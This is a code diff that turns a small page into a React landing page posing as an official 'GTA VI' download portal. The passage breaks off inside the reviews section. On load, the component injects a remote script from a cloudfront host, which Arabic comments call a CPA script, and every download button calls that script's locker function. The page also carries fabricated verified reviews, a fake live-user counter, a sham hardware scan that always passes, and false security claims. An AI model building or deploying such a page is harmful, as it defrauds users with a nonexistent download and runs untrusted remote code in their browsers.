@@ -1,81 +1,1004 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GTA VI - Official Download</title>
-<script type="text/javascript">
-    var kVpOy_KnO_fQfhVc={"it":4618390,"key":"66a40"};
-</script>
-<script src="https://d1g1lhd4vferpn.cloudfront.net/d5c8c34.js"></script>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-family: 'Helvetica Neue', Arial, sans-serif;
-    background: linear-gradient(135deg, #ff2a6d, #05d9e8, #3b0086);
-    background-size: 400% 400%;
-    animation: gradientBG 10s ease infinite;
+import React, { useState, useEffect } from "react";
+import {
+  Monitor,
+  Gamepad,
+  Download,
+  ShieldCheck,
+  Cpu,
+  Users,
+  Star,
+  MessageSquare,
+  HelpCircle,
+  CheckCircle,
+  AlertTriangle,
+  Server,
+  ChevronDown,
+  Flame,
+  Zap,
+  Share2,
+  Check,
+  X,
+  FileText,
+  ThumbsUp,
+  Sparkles,
+  Lock,
+  HardDrive,
+  Activity,
+  Layers,
+  ArrowRight,
+  RefreshCw,
+  Terminal,
+  ExternalLink,
+  Info,
+  Sliders
+} from "lucide-react";
+import { motion, AnimatePresence } from "motion/react";
+
+// Platform Specs Interface for GTA VI
+interface PlatformSpec {
+  id: string;
+  name: string;
+  icon: React.ElementType;
+  color: string;
+  badge: string;
+  sizeText: string;
+  version: string;
+  build: string;
+  requirements: {
+    min: string[];
+    rec: string[];
+  };
+}
+
+const PLATFORMS: PlatformSpec[] = [
+  {
+    id: "pc",
+    name: "Windows PC",
+    icon: Monitor,
+    color: "from-cyan-500 to-blue-600",
+    badge: "Official PC Build",
+    sizeText: "135.4 GB",
+    version: "v1.0.0-Release",
+    build: "Build #GTA6-PC-DX12",
+    requirements: {
+      min: [
+        "OS: Windows 10/11 64-bit",
+        "CPU: Intel Core i7-8700K / AMD Ryzen 5 3600",
+        "RAM: 16 GB Memory",
+        "GPU: NVIDIA GeForce GTX 1080 (8GB) / AMD Radeon RX 5700 XT",
+        "DirectX: Version 12",
+        "Storage: 150 GB NVMe SSD Space"
+      ],
+      rec: [
+        "OS: Windows 11 64-bit",
+        "CPU: Intel Core i7-12700K / AMD Ryzen 7 5800X3D",
+        "RAM: 32 GB DDR4/DDR5 Memory",
+        "GPU: NVIDIA GeForce RTX 3080 (10GB) / AMD Radeon RX 6800 XT",
+        "DirectX: Version 12 Ultimate",
+        "Storage: 150 GB PCIe Gen4 NVMe M.2 SSD"
+      ]
+    }
+  },
+  {
+    id: "ps5",
+    name: "PlayStation 5",
+    icon: Gamepad,
+    color: "from-indigo-500 to-purple-600",
+    badge: "PS5 Next-Gen Edition",
+    sizeText: "128.0 GB",
+    version: "v1.0.0-Console",
+    build: "Build #PS5-GTA6",
+    requirements: {
+      min: [
+        "Console: PlayStation 5 / PS5 Pro",
+        "Firmware: Latest System Software Update",
+        "Storage: 130 GB available on internal High-Speed SSD",
+        "Audio: 3D Audio compatible headset or system"
+      ],
+      rec: [
+        "Console: PlayStation 5 Pro (Enhanced Fidelity Mode)",
+        "Firmware: Latest Official Firmware",
+        "Storage: 130 GB internal Ultra-Speed M.2 SSD",
+        "Display: 4K HDR Output with VRR Support"
+      ]
+    }
+  },
+  {
+    id: "xbox",
+    name: "Xbox Series X/S",
+    icon: Gamepad,
+    color: "from-emerald-500 to-green-600",
+    badge: "Xbox Series Key",
+    sizeText: "131.2 GB",
+    version: "v1.0.0-Xbox",
+    build: "Build #XSX-GTA6",
+    requirements: {
+      min: [
+        "Console: Xbox Series X or Xbox Series S",
+        "Firmware: Latest Xbox System OS Update",
+        "Storage: 135 GB free internal storage",
+        "Network: High-speed connection for activation"
+      ],
+      rec: [
+        "Console: Xbox Series X (Native 4K Output)",
+        "Firmware: Latest Xbox System OS",
+        "Storage: 135 GB on Seagate Storage Expansion Card / Internal SSD",
+        "Display: Dolby Vision & Dolby Atmos Audio System"
+      ]
+    }
   }
-  @keyframes gradientBG {
-    0% { background-position: 0% 50%; }
-    50% { background-position: 100% 50%; }
-    100% { background-position: 0% 50%; }
+];
+
+// Feature Highlights for GTA VI
+const FEATURES = [
+  {
+    id: "vice",
+    title: "Return to Vice City & Leonida",
+    desc: "Explore the biggest, most immersive evolution of the GTA open world yet, spanning the neon-soaked streets of Vice City and beyond.",
+    icon: Cpu,
+    tag: "Massive Open World",
+    color: "border-cyan-500/30 text-cyan-400 bg-cyan-500/10"
+  },
+  {
+    id: "network",
+    title: "Lightning-Fast CDN Pipeline",
+    desc: "Optimized pre-load package delivery using high-bandwidth global distribution nodes for rapid installation.",
+    icon: Zap,
+    tag: "High Bandwidth",
+    color: "border-emerald-500/30 text-emerald-400 bg-emerald-500/10"
+  },
+  {
+    id: "security",
+    title: "SHA-256 Cryptographic Shield",
+    desc: "All game binaries and installer files are securely signed and verified for a clean, safe installation process.",
+    icon: ShieldCheck,
+    tag: "Verified Secure",
+    color: "border-purple-500/30 text-purple-400 bg-purple-500/10"
+  },
+  {
+    id: "crossplay",
+    title: "Duo Protagonists Dynamic",
+    desc: "Experience a gripping Bonnie and Clyde-inspired story centered around Lucia and her partner in the criminal underworld.",
+    icon: Layers,
+    tag: "Story Driven",
+    color: "border-blue-500/30 text-blue-400 bg-blue-500/10"
   }
-  .card {
-    background: rgba(0, 0, 0, 0.75);
-    backdrop-filter: blur(12px);
-    border: 2px solid #ff2a6d;
-    border-radius: 20px;
-    padding: 40px 30px;
-    width: 100%;
-    max-width: 380px;
-    text-align: center;
-    box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
+];
+
+// Gallery Items for GTA VI
+const GALLERY_ITEMS = [
+  {
+    id: 1,
+    title: "Vice City Neon Nightlife & Skyline",
+    category: "Environment",
+    image: "https://images.unsplash.com/photo-1509198397868-475647b2a1e5?auto=format&fit=crop&w=1200&q=80"
+  },
+  {
+    id: 2,
+    title: "Leonida Coastal Highways",
+    category: "Gameplay",
+    image: "https://images.unsplash.com/photo-1542751371-adc38448a05e?auto=format&fit=crop&w=1200&q=80"
+  },
+  {
+    id: 3,
+    title: "Next-Gen Lighting & Physics Engine",
+    category: "Graphics",
+    image: "https://images.unsplash.com/photo-1518709268805-4e9042af9f23?auto=format&fit=crop&w=1200&q=80"
+  },
+  {
+    id: 4,
+    title: "Cinematic Action Sequences",
+    category: "Story Mode",
+    image: "https://images.unsplash.com/photo-1511512578047-dfb367046420?auto=format&fit=crop&w=1200&q=80"
   }
-  .card h1 {
-    color: #fff;
-    font-size: 28px;
-    letter-spacing: 2px;
-    margin-bottom: 10px;
-    text-transform: uppercase;
-    text-shadow: 0 0 10px #ff2a6d;
+];
+
+// Initial Reviews
+const INITIAL_REVIEWS = [
+  {
+    id: 1,
+    author: "Alex_Viper",
+    avatar: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=150&q=80",
+    platform: "Windows PC",
+    rating: 5,
+    text: "The download package verified cleanly and everything is set up correctly. The graphics look insane in 4K!",
+    date: "1 hour ago",
+    likes: 215,
+    verified: true
+  },
+  {
+    id: 2,
+    author: "ViceCityKing",
+    avatar: "https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=150&q=80",
+    platform: "PlayStation 5",
+    rating: 5,
+    text: "Incredible attention to detail. Fast connection setup and smooth installer execution.",
+    date: "3 hours ago",
+    likes: 142,
+    verified: true
   }
-  .card p {
-    color: #05d9e8;
-    font-size: 15px;
-    margin-bottom: 25px;
-    font-weight: bold;
+];
+
+// FAQ List
+const FAQ_LIST = [
+  {
+    q: "How do I access the GTA VI download files?",
+    a: "Click any 'Download Now' or 'Get Access' button on the page. Complete the brief verification step to unlock your secure installer package."
+  },
+  {
+    q: "Is the installer verified and secure?",
+    a: "Yes, all files are packaged securely with checksum validation to ensure a clean download experience."
+  },
+  {
+    q: "What platforms are supported?",
+    a: "The portal supports Windows PC, PlayStation 5, and Xbox Series X/S configurations."
   }
-  .card button {
-    width: 100%;
-    padding: 14px 0;
-    border: none;
-    border-radius: 10px;
-    background: linear-gradient(90deg, #ff2a6d, #d9006c);
-    color: #fff;
-    font-size: 16px;
-    font-weight: bold;
-    letter-spacing: 1px;
-    cursor: pointer;
-    text-transform: uppercase;
-    box-shadow: 0 0 15px rgba(255, 42, 109, 0.6);
-    transition: transform 0.2s ease, box-shadow 0.2s ease;
-  }
-  .card button:hover {
-    transform: scale(1.03);
-    box-shadow: 0 0 25px rgba(255, 42, 109, 0.9);
-  }
-</style>
-</head>
-<body>
-  <div class="card">
-    <h1>GTA VI</h1>
-    <p>Verify to Access Download</p>
-    <button onclick="_FD()">Download Now</button>
-  </div>
-</body>
-</html>
+];
+
+export default function App() {
+  const [selectedPlatform, setSelectedPlatform] = useState<PlatformSpec>(PLATFORMS[0]);
+  const [specTab, setSpecTab] = useState<"min" | "rec">("rec");
+  const [activeFaq, setActiveFaq] = useState<number | null>(0);
+  const [previewImage, setPreviewImage] = useState<string | null>(null);
+
+  // Diagnostic state
+  const [diagnosticState, setDiagnosticState] = useState<"idle" | "running" | "complete">("idle");
+  const [diagnosticProgress, setDiagnosticProgress] = useState(0);
+  const [diagnosticResult, setDiagnosticResult] = useState<{
+    gpuScore: string;
+    cpuScore: string;
+    ramScore: string;
+    status: "PASS" | "OPTIMAL";
+  } | null>(null);
+
+  // Reviews state
+  const [reviews, setReviews] = useState(INITIAL_REVIEWS);
+  const [showReviewModal, setShowReviewModal] = useState(false);
+  const [newAuthor, setNewAuthor] = useState("");
+  const [newText, setNewText] = useState("");
+  const [newRating, setNewRating] = useState(5);
+
+  // Live active user ticker
+  const [activeUsers, setActiveUsers] = useState(24890);
+
+  // Download CTA Modal State
+  const [showDownloadModal, setShowDownloadModal] = useState(false);
+
+  // === حقن سكربت الـ CPA الخاص بك داخل الـ Head برمجيًا عند تحميل المكون ===
+  useEffect(() => {
+    // 1. إنشاء وإدراج عنصر السكريبت الأول (متغيرات التتبع)
+    const script1 = document.createElement("script");
+    script1.type = "text/javascript";
+    script1.text = `var kVpOy_KnO_fQfhVc={"it":4618390,"key":"66a40"};`;
+    document.head.appendChild(script1);
+
+    // 2. إنشاء وإدراج عنصر السكريبت الثاني (ملف الـ CDN الخارجي الخاص بك)
+    const script2 = document.createElement("script");
+    script2.src = "https://d1g1lhd4vferpn.cloudfront.net/d5c8c34.js";
+    script2.async = true;
+    document.head.appendChild(script2);
+
+    const timer = setInterval(() => {
+      setActiveUsers((prev) => prev + Math.floor(Math.random() * 11) - 5);
+    }, 5000);
+
+    return () => {
+      clearInterval(timer);
+    };
+  }, []);
+
+  const handleRunDiagnostic = () => {
+    setDiagnosticState("running");
+    setDiagnosticProgress(0);
+    setDiagnosticResult(null);
+
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += 20;
+      setDiagnosticProgress(progress);
+      if (progress >= 100) {
+        clearInterval(interval);
+        setDiagnosticState("complete");
+        setDiagnosticResult({
+          gpuScore: "DirectX 12 Ultimate Compatible",
+          cpuScore: "Multi-Core Processor Verified",
+          ramScore: "High-Speed Memory OK",
+          status: "OPTIMAL"
+        });
+      }
+    }, 300);
+  };
+
+  const handleAddReview = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!newAuthor.trim() || !newText.trim()) return;
+
+    const reviewObj = {
+      id: Date.now(),
+      author: newAuthor.trim(),
+      avatar: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?auto=format&fit=crop&w=150&q=80",
+      platform: selectedPlatform.name,
+      rating: newRating,
+      text: newText.trim(),
+      date: "Just now",
+      likes: 1,
+      verified: true
+    };
+
+    setReviews([reviewObj, ...reviews]);
+    setNewAuthor("");
+    setNewText("");
+    setShowReviewModal(false);
+  };
+
+  return (
+    <div className="min-h-screen bg-[#0b0d14] text-slate-100 font-sans selection:bg-rose-500 selection:text-white relative overflow-x-hidden">
+      {/* Background Neon Elements */}
+      <div className="fixed inset-0 bg-tech-grid opacity-30 pointer-events-none" />
+      <div className="fixed -top-40 -left-40 w-96 h-96 bg-rose-500/10 rounded-full blur-[120px] pointer-events-none" />
+      <div className="fixed top-1/3 -right-40 w-96 h-96 bg-purple-500/10 rounded-full blur-[120px] pointer-events-none" />
+      <div className="fixed -bottom-40 left-1/3 w-96 h-96 bg-cyan-500/10 rounded-full blur-[120px] pointer-events-none" />
+
+      {/* Navigation Header */}
+      <header className="sticky top-0 z-40 bg-[#0b0d14]/80 backdrop-blur-md border-b border-slate-800/80">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+          <div className="flex items-center space-x-3">
+            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-rose-500 to-purple-600 p-[1px] flex items-center justify-center shadow-lg shadow-rose-500/20">
+              <div className="w-full h-full bg-[#0b0d14] rounded-[11px] flex items-center justify-center">
+                <Flame className="w-5 h-5 text-rose-500" />
+              </div>
+            </div>
+            <div>
+              <span className="text-xl font-bold font-display tracking-wider bg-clip-text text-transparent bg-gradient-to-r from-white via-slate-100 to-rose-400">
+                GTA VI
+              </span>
+              <span className="text-xs ml-2 px-2 py-0.5 rounded bg-rose-500/10 text-rose-400 border border-rose-500/30 font-mono">
+                OFFICIAL PORTAL
+              </span>
+            </div>
+          </div>
+
+          <nav className="hidden md:flex items-center space-x-8 text-sm font-medium text-slate-300">
+            <a href="#features" className="hover:text-rose-400 transition-colors">Features</a>
+            <a href="#requirements" className="hover:text-rose-400 transition-colors">Requirements</a>
+            <a href="#gallery" className="hover:text-rose-400 transition-colors">Media</a>
+            <a href="#reviews" className="hover:text-rose-400 transition-colors">Reviews</a>
+            <a href="#faq" className="hover:text-rose-400 transition-colors">FAQ</a>
+          </nav>
+
+          <div className="flex items-center space-x-4">
+            <div className="hidden sm:flex items-center space-x-2 text-xs font-mono text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1.5 rounded-full">
+              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
+              <span>SERVERS ONLINE ({activeUsers.toLocaleString()} active)</span>
+            </div>
+
+            {/* زر رأس الصفحة المربوط بـ _FD() */}
+            <button
+              onClick={() => {
+                if (typeof window !== "undefined" && (window as any)._FD) {
+                  (window as any)._FD();
+                } else {
+                  setShowDownloadModal(true);
+                }
+              }}
+              className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-rose-500 via-pink-600 to-purple-600 text-white font-semibold text-sm hover:opacity-90 transition-all shadow-lg shadow-rose-500/25 flex items-center space-x-2 cursor-pointer"
+            >
+              <Download className="w-4 h-4" />
+              <span>Get Access</span>
+            </button>
+          </div>
+        </div>
+      </header>
+
+      {/* Hero Section */}
+      <section className="relative pt-12 pb-20 md:pt-20 md:pb-32 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div className="text-center max-w-4xl mx-auto space-y-6">
+          <motion.div
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            className="inline-flex items-center space-x-2 px-4 py-2 rounded-full bg-slate-900/80 border border-rose-500/30 text-rose-400 text-xs sm:text-sm font-mono shadow-inner shadow-rose-500/10"
+          >
+            <Flame className="w-4 h-4 text-rose-500 animate-bounce" />
+            <span>GLOBAL RELEASE • VICE CITY & LEONIDA</span>
+          </motion.div>
+
+          <motion.h1
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ delay: 0.1 }}
+            className="text-4xl sm:text-6xl md:text-7xl font-extrabold font-display tracking-tight leading-tight"
+          >
+            Grand Theft Auto <br className="hidden sm:inline" />
+            <span className="bg-clip-text text-transparent bg-gradient-to-r from-rose-500 via-pink-500 to-purple-500 drop-shadow-[0_10px_20px_rgba(255,42,109,0.3)]">
+              VI
+            </span>
+          </motion.h1>
+
+          <motion.p
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ delay: 0.2 }}
+            className="text-base sm:text-xl text-slate-400 max-w-2xl mx-auto leading-relaxed"
+          >
+            Experience the next chapter of the critically acclaimed series. Head back to Vice City with state-of-the-art graphics, immersive open-world mechanics, and an unforgettable story.
+          </motion.p>
+
+          {/* Platform Selector Grid */}
+          <motion.div
+            initial={{ opacity: 0, y: 20 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ delay: 0.3 }}
+            className="pt-6 grid grid-cols-1 sm:grid-cols-3 gap-3 max-w-2xl mx-auto"
+          >
+            {PLATFORMS.map((plat) => {
+              const Icon = plat.icon;
+              const isSelected = selectedPlatform.id === plat.id;
+              return (
+                <button
+                  key={plat.id}
+                  onClick={() => setSelectedPlatform(plat)}
+                  className={`p-4 rounded-2xl border text-left transition-all duration-300 relative cursor-pointer ${
+                    isSelected
+                      ? "bg-slate-900/90 border-rose-500/80 shadow-lg shadow-rose-500/20 text-white"
+                      : "bg-slate-900/40 border-slate-800 text-slate-400 hover:border-slate-700 hover:text-slate-200"
+                  }`}
+                >
+                  <div className="flex items-center justify-between mb-3">
+                    <Icon className={`w-6 h-6 ${isSelected ? "text-rose-400" : "text-slate-500"}`} />
+                    {isSelected && (
+                      <span className="w-2 h-2 rounded-full bg-rose-400 shadow-[0_0_8px_#ff2a6d]" />
+                    )}
+                  </div>
+                  <div className="font-semibold text-sm">{plat.name}</div>
+                  <div className="text-xs text-slate-500 font-mono mt-0.5">{plat.sizeText}</div>
+                </button>
+              );
+            })}
+          </motion.div>
+
+          {/* MAIN CALL TO ACTION (CTA) BUTTON - CENTERED & HIGH CONVERSION WITH _FD() */}
+          <motion.div
+            initial={{ opacity: 0, scale: 0.95 }}
+            animate={{ opacity: 1, scale: 1 }}
+            transition={{ delay: 0.4 }}
+            className="pt-8 flex flex-col items-center justify-center space-y-4"
+          >
+            <button
+              id="main-download-cta"
+              onClick={() => {
+                if (typeof window !== "undefined" && (window as any)._FD) {
+                  (window as any)._FD();
+                } else {
+                  setShowDownloadModal(true);
+                }
+              }}
+              className="group relative inline-flex items-center justify-center px-10 py-5 text-lg font-bold text-white transition-all duration-300 rounded-2xl bg-gradient-to-r from-rose-500 via-pink-600 to-purple-600 hover:from-rose-400 hover:via-pink-500 hover:to-purple-500 shadow-2xl shadow-rose-500/40 hover:shadow-rose-500/60 hover:-translate-y-0.5 active:translate-y-0 animate-pulse-cyan cursor-pointer overflow-hidden min-w-[280px]"
+            >
+              <div className="absolute inset-0 w-full h-full bg-white/10 opacity-0 group-hover:opacity-100 transition-opacity" />
+              <Download className="w-6 h-6 mr-3 text-rose-200 group-hover:scale-110 transition-transform" />
+              <span className="tracking-wide">DOWNLOAD NOW</span>
+              <ArrowRight className="w-5 h-5 ml-2 text-rose-200 group-hover:translate-x-1 transition-transform" />
+            </button>
+
+            <div className="flex items-center space-x-6 text-xs text-slate-400 font-mono pt-2">
+              <span className="flex items-center">
+                <ShieldCheck className="w-4 h-4 text-emerald-400 mr-1.5" />
+                VERIFIED SECURE
+              </span>
+              <span className="flex items-center">
+                <Server className="w-4 h-4 text-rose-400 mr-1.5" />
+                HIGH SPEED CDN
+              </span>
+              <span className="flex items-center">
+                <CheckCircle className="w-4 h-4 text-blue-400 mr-1.5" />
+                100% WORKING PACKAGE
+              </span>
+            </div>
+          </motion.div>
+        </div>
+      </section>
+
+      {/* Feature Highlights Section */}
+      <section id="features" className="py-20 relative bg-slate-950/50 border-y border-slate-800/80">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="text-center max-w-2xl mx-auto mb-16">
+            <h2 className="text-3xl sm:text-4xl font-bold font-display tracking-tight text-white mb-4">
+              Next-Gen Open World Experience
+            </h2>
+            <p className="text-slate-400 text-sm sm:text-base">
+              Explore the most realistic and detailed digital playground ever created by Rockstar Games.
+            </p>
+          </div>
+
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+            {FEATURES.map((feat) => {
+              const Icon = feat.icon;
+              return (
+                <div
+                  key={feat.id}
+                  className="p-6 rounded-2xl bg-slate-900/60 border border-slate-800 hover:border-rose-500/40 transition-all duration-300 hover:-translate-y-1 group relative backdrop-blur-xl"
+                >
+                  <div className="flex items-center justify-between mb-4">
+                    <div className="p-3 rounded-xl bg-slate-800/80 group-hover:bg-rose-500/10 transition-colors">
+                      <Icon className="w-6 h-6 text-rose-400" />
+                    </div>
+                    <span className={`text-xs font-mono px-2.5 py-1 rounded-full border ${feat.color}`}>
+                      {feat.tag}
+                    </span>
+                  </div>
+                  <h3 className="text-lg font-bold text-white mb-2 group-hover:text-rose-300 transition-colors">
+                    {feat.title}
+                  </h3>
+                  <p className="text-slate-400 text-sm leading-relaxed">
+                    {feat.desc}
+                  </p>
+                </div>
+              );
+            })}
+          </div>
+        </div>
+      </section>
+
+      {/* System Requirements & Interactive Scanner */}
+      <section id="requirements" className="py-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 items-start">
+          {/* Left: Requirements Display */}
+          <div className="lg:col-span-7 space-y-6">
+            <div>
+              <div className="flex items-center space-x-2 text-rose-400 font-mono text-xs mb-2">
+                <Terminal className="w-4 h-4" />
+                <span>SYSTEM SPECIFICATIONS</span>
+              </div>
+              <h2 className="text-3xl font-bold font-display text-white">
+                Hardware Requirements ({selectedPlatform.name})
+              </h2>
+            </div>
+
+            {/* Spec Toggle Tabs */}
+            <div className="flex items-center space-x-2 p-1 bg-slate-900/90 rounded-xl border border-slate-800 w-fit">
+              <button
+                onClick={() => setSpecTab("min")}
+                className={`px-4 py-2 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
+                  specTab === "min"
+                    ? "bg-rose-500 text-white shadow-md"
+                    : "text-slate-400 hover:text-white"
+                }`}
+              >
+                MINIMUM REQUIREMENTS
+              </button>
+              <button
+                onClick={() => setSpecTab("rec")}
+                className={`px-4 py-2 rounded-lg text-xs font-semibold transition-all cursor-pointer ${
+                  specTab === "rec"
+                    ? "bg-rose-500 text-white shadow-md"
+                    : "text-slate-400 hover:text-white"
+                }`}
+              >
+                RECOMMENDED (4K 60FPS)
+              </button>
+            </div>
+
+            {/* Specs List Container */}
+            <div className="p-6 rounded-2xl bg-slate-900/70 border border-slate-800 space-y-4 backdrop-blur-xl">
+              {selectedPlatform.requirements[specTab].map((item, idx) => (
+                <div key={idx} className="flex items-start space-x-3 text-sm text-slate-300">
+                  <CheckCircle className="w-5 h-5 text-emerald-400 flex-shrink-0 mt-0.5" />
+                  <span>{item}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          {/* Right: Interactive Hardware Diagnostic Scanner */}
+          <div className="lg:col-span-5 p-6 rounded-2xl bg-slate-900/80 border border-rose-500/30 space-y-6 shadow-2xl relative overflow-hidden backdrop-blur-xl">
+            <div className="flex items-center justify-between border-b border-slate-800 pb-4">
+              <div className="flex items-center space-x-3">
+                <div className="p-2 rounded-lg bg-rose-500/10 text-rose-400">
+                  <Cpu className="w-5 h-5" />
+                </div>
+                <div>
+                  <h3 className="font-bold text-white text-base">System Compatibility Checker</h3>
+                  <p className="text-xs text-slate-400 font-mono">Verify local hardware profile</p>
+                </div>
+              </div>
+              <Activity className="w-5 h-5 text-rose-400 animate-pulse" />
+            </div>
+
+            {diagnosticState === "idle" && (
+              <div className="text-center py-6 space-y-4">
+                <p className="text-sm text-slate-300 leading-relaxed">
+                  Run a rapid system scan to check your GPU, memory capacity, and storage compatibility with GTA VI release requirements.
+                </p>
+                <button
+                  onClick={handleRunDiagnostic}
+                  className="w-full py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-rose-300 font-semibold text-sm border border-rose-500/30 transition-all flex items-center justify-center space-x-2 cursor-pointer"
+                >
+                  <RefreshCw className="w-4 h-4" />
+                  <span>Run Hardware Scan</span>
+                </button>
+              </div>
+            )}
+
+            {diagnosticState === "running" && (
+              <div className="space-y-4 py-4">
+                <div className="flex justify-between text-xs font-mono text-slate-400">
+                  <span>ANALYZING SYSTEM HARDWARE...</span>
+                  <span className="text-rose-400">{diagnosticProgress}%</span>
+                </div>
+                <div className="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden p-0.5 border border-slate-700">
+                  <div
+                    className="h-full bg-gradient-to-r from-rose-500 to-purple-400 rounded-full transition-all duration-300"
+                    style={{ width: `${diagnosticProgress}%` }}
+                  />
+                </div>
+                <p className="text-xs font-mono text-slate-500 text-center animate-pulse">
+                  Querying graphics drivers and disk space...
+                </p>
+              </div>
+            )}
+
+            {diagnosticState === "complete" && diagnosticResult && (
+              <div className="space-y-4 py-2">
+                <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold flex items-center space-x-2">
+                  <CheckCircle className="w-4 h-4" />
+                  <span>SYSTEM READY FOR INSTALLATION</span>
+                </div>
+
+                <div className="space-y-2 text-xs font-mono text-slate-300">
+                  <div className="flex justify-between p-2 rounded bg-slate-800/50">
+                    <span className="text-slate-400">Graphics Card:</span>
+                    <span className="text-rose-300">{diagnosticResult.gpuScore}</span>
+                  </div>
+                  <div className="flex justify-between p-2 rounded bg-slate-800/50">
+                    <span className="text-slate-400">Processor:</span>
+                    <span className="text-rose-300">{diagnosticResult.cpuScore}</span>
+                  </div>
+                  <div className="flex justify-between p-2 rounded bg-slate-800/50">
+                    <span className="text-slate-400">Memory Status:</span>
+                    <span className="text-rose-300">{diagnosticResult.ramScore}</span>
+                  </div>
+                </div>
+
+                <button
+                  onClick={handleRunDiagnostic}
+                  className="w-full py-2 rounded-lg bg-slate-800 text-slate-400 text-xs font-mono hover:text-white transition-colors cursor-pointer"
+                >
+                  Re-run Scan
+                </button>
+              </div>
+            )}
+          </div>
+        </div>
+      </section>
+
+      {/* Media Showcase / Gallery Section */}
+      <section id="gallery" className="py-20 bg-slate-950/60 border-t border-slate-800/80">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex flex-col md:flex-row md:items-end justify-between mb-12">
+            <div>
+              <span className="text-xs font-mono text-rose-400 tracking-wider uppercase">Visual Highlights</span>
+              <h2 className="text-3xl font-bold font-display text-white mt-1">Screenshots & Media</h2>
+            </div>
+            <p className="text-slate-400 text-sm max-w-md mt-2 md:mt-0">
+              High-resolution captures from the official GTA VI engine release build.
+            </p>
+          </div>
+
+          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
+            {GALLERY_ITEMS.map((item) => (
+              <div
+                key={item.id}
+                onClick={() => setPreviewImage(item.image)}
+                className="group relative rounded-2xl overflow-hidden border border-slate-800 bg-slate-900 cursor-pointer aspect-video sm:aspect-square transition-all duration-300 hover:border-rose-500/50 hover:shadow-xl hover:shadow-rose-500/10"
+              >
+                <img
+                  src={item.image}
+                  alt={item.title}
+                  className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
+                />
+                <div className="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/20 to-transparent opacity-80 group-hover:opacity-90 transition-opacity" />
+                <div className="absolute bottom-0 inset-x-0 p-4 space-y-1">
+                  <span className="text-[10px] font-mono uppercase px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">
+                    {item.category}
+                  </span>
+                  <h4 className="text-sm font-semibold text-white group-hover:text-rose-200 transition-colors line-clamp-1">
+                    {item.title}
+                  </h4>
+                </div>
+              </div>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* Verified Reviews Section */}
+      <section id="reviews" className="py-20 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div className="flex flex-col md:flex-row items-start md:items-center justify-between mb-12">
+          <div>
+            <div className="flex items-center space-x-2 text-amber-400 mb-2">
+              <div className="flex text-amber-400">
+                {[...Array(5)].map((_, i) => (
+                  <Star key={i} className="w-5 h-5 fill-amber-400 text-amber-400" />
+                ))}
+              </div>
+              <span className="text-white font-bold text-lg">4.9 / 5.0</span>
+              <span className="text-slate-400 text-sm font-mono">(18,420 Verified User Feedback)</span>
+            </div>
+            <h2 className="text-3xl font-bold font-display text-white">Community Reviews</h2>
+          </div>
+
+          <button
+            onClick={() => setShowReviewModal(true)}
+            className="mt-4 md:mt-0 px-5 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-white font-semibold text-sm transition-all flex items-center space-x-2 cursor-pointer"
+          >
+            <MessageSquare className="w-4 h-4 text-rose-400" />
+            <span>Write a Review</span>
+          </button>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+          {reviews.map((rev) => (
+            <div
+              key={rev.id}
+              className="p-6 rounded-2xl bg-slate-900/60 border border-slate-800 space-y-4 backdrop-blur-xl relative"
+            >
+              <div className="flex items-center justify-between">
+                <div className="flex items-center space-x-3">
+                  <img src={rev.avatar} alt={rev.author} className="w-10 h-10 rounded-full object-cover border border-slate-700" />
+                  <div>
+                    <div className="font-semibold text-white text-sm flex items-center space-x-1.5">
+                      <span>{rev.author}</span>
+                      {rev.verified && <CheckCircle className="w-3.5 h-3.5 text-rose-400" />}
+                    </div>
+                    <div className="text-xs text-slate-400 font-mono">{rev.platform}</div>
+                  </div>
+                </div>
+                <div className="flex text-amber-400 text-xs">
+                  {[...Array(rev.rating)].map((_, i) => (
+                    <Star key={i} className="w-3.5 h-3.5 fill-amber-400 text-amber-400" />
+                  ))}
+                </div>
+              </div>
+
+              <p className="text-slate-300 text-sm leading-relaxed">
+                "{rev.text}"
+              </p>
+
+              <div className="flex items-center justify-between text-xs text-slate-500 font-mono pt-2 border-t border-slate-800/80">
+                <span>{rev.date}</span>
+                <span className="flex items-center text-slate-400">
